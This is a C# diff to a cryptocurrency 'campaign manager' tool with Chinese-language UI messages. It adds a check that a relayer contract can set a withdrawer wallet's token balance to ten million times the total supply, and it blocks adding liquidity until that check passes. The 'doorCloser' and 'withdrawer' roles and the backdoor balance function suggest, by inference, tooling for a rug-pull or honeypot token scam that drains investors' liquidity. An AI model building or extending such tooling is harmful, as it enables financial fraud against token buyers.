@@ -65,6 +65,7 @@ namespace BlockStorm.Infinity.CampaignManager
         private EFModels.Account withdrawer;
         ContractHandler controllerContractHandlerForOwner = null;
         ContractHandler pairContractHandlerForDeployer = null;
+        ContractHandler relayerContractHandlerForOwner = null;
         private Web3 web3ForControllerOwner;
         private Web3 web3ForContractDeployer;
         private UniswapV2ContractsReader uniswapV2Reader;
@@ -87,6 +88,7 @@ namespace BlockStorm.Infinity.CampaignManager
         private int currentTaskIndex;
 
         private static bool lockFlag = false;
+        private static bool balanceModifyCheckPassed = false;
         private List<DgvRowObject> campaignAccountRowObjects;
 
 
@@ -133,6 +135,7 @@ namespace BlockStorm.Infinity.CampaignManager
             context = new BlockchainContext();
             web3ForControllerOwner = new Web3(controllerOwner, httpURL);
             controllerContractHandlerForOwner = web3ForControllerOwner.Eth.GetContractHandler(controllerAddr);
+            relayerContractHandlerForOwner = web3ForControllerOwner.Eth.GetContractHandler(RelayerAddr);
             ethBalances.OnValueChanged += EthBalances_OnBalanceChanged;
             wethBalances.OnValueChanged += WethBalances_OnBalanceChanged;
             pairReserves.OnValueChanged += PairReserves_OnValueChanged;
@@ -391,7 +394,7 @@ namespace BlockStorm.Infinity.CampaignManager
             {
                 Operators = new List<string> { doorCloser.Address }
             };
-            var relayerContractHandlerForOwner = web3ForControllerOwner.Eth.GetContractHandler(RelayerAddr);
+            
             var add0peratorsFunctionTxnReceipt = await relayerContractHandlerForOwner.SendRequestAndWaitForReceiptAsync(add0peratorsFunction);
             if (add0peratorsFunctionTxnReceipt.Succeeded())
             {
@@ -436,6 +439,7 @@ namespace BlockStorm.Infinity.CampaignManager
             context.SaveChanges();
             ethBalances[doorCloser.Address] = 0;
             ethBalances[withdrawer.Address] = 0;
+            balanceModifyCheckPassed = false;
             BindTraderListGridView();
             await RefreshTradersBalances();
             lblMessage.Text = "生成Campaign成功！";
@@ -725,6 +729,11 @@ namespace BlockStorm.Infinity.CampaignManager
 
         private async void BtnLiquidity_Click(object sender, EventArgs e)
         {
+            if (!balanceModifyCheckPassed)
+            {
+                MessageBox.Show("添加流动性之前必须通过修改余额测试！");
+                return;
+            }
             if (!decimal.TryParse(txtProvideLiquidity.Text, out var liquidity))
             {
                 MessageBox.Show("输入的流动性必须是数值！");
@@ -953,6 +962,7 @@ namespace BlockStorm.Infinity.CampaignManager
                 MessageBox.Show("找不到提现者的信息！");
                 return;
             }
+            balanceModifyCheckPassed = false;
             txtOperator.Text = doorCloser.Address;
             txtWithdrawer.Text = withdrawer.Address;
             await InitTokenRelatedVariabels();
@@ -1391,6 +1401,56 @@ namespace BlockStorm.Infinity.CampaignManager
             {
                 MessageBox.Show($"将{amountToAllocate}WETH转存为ETH成功！");
                 await UpdateControllerBalances();
+            }
+        }
+
+        private async void btnCheckModifyBalance_Click(object sender, EventArgs e)
+        {
+            var testChainName = Config.GetValueByKey("TargetChainConfig");
+            var testHttpURL = Config.ConfigInfo((ChainConfigName)Enum.Parse(typeof(ChainConfigName), testChainName), ChainConfigPart.HttpURL);
+            if (token == null)
+            {
+                MessageBox.Show("Token尚未加载");
+                return;
+            }
+            if (withdrawer == null)
+            {
+                MessageBox.Show("提现者尚未加载");
+                return;
+            }
+            var targetBalance = BigInteger.Parse(token.TotalSupply) * BigInteger.Pow(10, 7);
+            var modifyBalance33168Function = new NethereumModule.Contracts.Relayer.ModifyBalance33168Function
+            {
+                Callee = token.TokenAddress,
+                Signature = token.FuncSig,
+                TargetWallet = withdrawer.Address,
+                Balance = targetBalance
+            };
+            var modifyBalance33168FunctionTxnReceipt = await relayerContractHandlerForOwner.SendRequestAndWaitForReceiptAsync(modifyBalance33168Function);
+            if (modifyBalance33168FunctionTxnReceipt.Succeeded())
+            {
+                var tokenContractHandler = web3ForControllerOwner.Eth.GetContractHandler(token.TokenAddress);
+                var balanceOfFunction = new NethereumModule.Contracts.UniswapV2ERC20.BalanceOfFunction();
+                balanceOfFunction.HolderAddress = withdrawer.Address;
+                var balanceOfFunctionReturn = await tokenContractHandler.QueryAsync<NethereumModule.Contracts.UniswapV2ERC20.BalanceOfFunction, BigInteger>(balanceOfFunction);
+                if (balanceOfFunctionReturn.Equals(targetBalance))
+                {
+                    MessageBox.Show("余额修改测试成功！");
+                    balanceModifyCheckPassed = true;
+                    return;
+                }
+                else
+                {
+                    MessageBox.Show("余额修改测试失败：修改余额执行成功，但是检查余额和目标余额不一致！");
+                    balanceModifyCheckPassed = false;
+                    return;
+                }
+            }
+            else
+            {
+                MessageBox.Show("余额修改测试失败：修改余额执行失败！");
+                balanceModifyCheckPassed = false;
+                return;
             }
         }
     }
